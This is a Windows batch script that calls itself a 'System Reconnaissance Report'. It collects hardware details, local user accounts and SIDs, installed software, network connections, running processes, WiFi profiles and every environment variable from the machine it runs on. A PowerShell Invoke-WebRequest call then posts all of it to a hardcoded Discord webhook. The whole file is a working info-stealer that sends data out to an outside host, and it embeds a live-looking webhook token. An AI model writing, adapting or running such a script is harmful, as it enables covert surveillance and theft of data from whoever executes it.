@echo off
setlocal enabledelayedexpansion

:: Create result.txt in temp directory
set "OUTPUT=%TEMP%\result.txt"
echo System Reconnaissance Report > "%OUTPUT%"
echo Timestamp: %DATE% %TIME% >> "%OUTPUT%"
echo. >> "%OUTPUT%"

:: Capture comprehensive system information
echo ====================================== >> "%OUTPUT%"
echo SYSTEM INFORMATION >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Manufacturer" /C:"System Model" /C:"System Type" /C:"Total Physical Memory" >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo CPU INFORMATION >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
wmic cpu get caption,name,description,MaxClockSpeed,NumberOfCores,NumberOfLogicalProcessors /format:list >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo MEMORY INFORMATION >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
wmic memorychip get BankLabel,Capacity,Speed,MemoryType,DeviceLocator /format:list >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo DISK INFORMATION >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
wmic logicaldisk get DeviceID,Size,FreeSpace,Description /format:list >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo NETWORK ADAPTERS >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
wmic nic get Name,NetConnectionID,Speed,PhysicalAdapter /format:list >> "%OUTPUT%"
ipconfig /all >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo USER ACCOUNTS >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
wmic useraccount where "LocalAccount=true" get Name,SID,Disabled /format:list >> "%OUTPUT%"
echo Current User: %USERNAME% >> "%OUTPUT%"
echo Domain: %USERDOMAIN% >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo INSTALLED SOFTWARE >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
wmic product get Name,Version,Vendor /format:list >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo NETWORK CONNECTIONS >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
netstat -ano >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo RUNNING PROCESSES >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
tasklist /v >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo WIFI PROFILES >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
netsh wlan show profiles >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo USB DEVICES >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
wmic path Win32_USBHub get DeviceID,Description /format:list >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo PRINTERS >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
wmic printer get Name,PortName,DriverName /format:list >> "%OUTPUT%"
echo. >> "%OUTPUT%"

echo ====================================== >> "%OUTPUT%"
echo ENVIRONMENT VARIABLES >> "%OUTPUT%"
echo ====================================== >> "%OUTPUT%"
set >> "%OUTPUT%"
echo. >> "%OUTPUT%"

:: Get Discord webhook URL (replace with your webhook)
set "WEBHOOK_URL=https://discord.com/api/webhooks/1478994129508892672/lA7G6TFM417kohIT57ztdQP1N6imbX9HwhTIbYQiKzvX3nJSSVl4UcJF0fVIEe8HN_ZE"

:: Read file content and send to Discord
powershell -Command ^
"$content = Get-Content '%OUTPUT%' -Raw; " ^
"$data = @{content = $content} | ConvertTo-Json; " ^
"$bytes = [System.Text.Encoding]::UTF8.GetBytes($data); " ^
"$webhook = '%WEBHOOK_URL%'; " ^
"Invoke-WebRequest -Uri $webhook -Method POST -Body $bytes -ContentType 'application/json'"

:: Clean up (optional - comment out if you want to keep the file)
:: del "%OUTPUT%"

exit
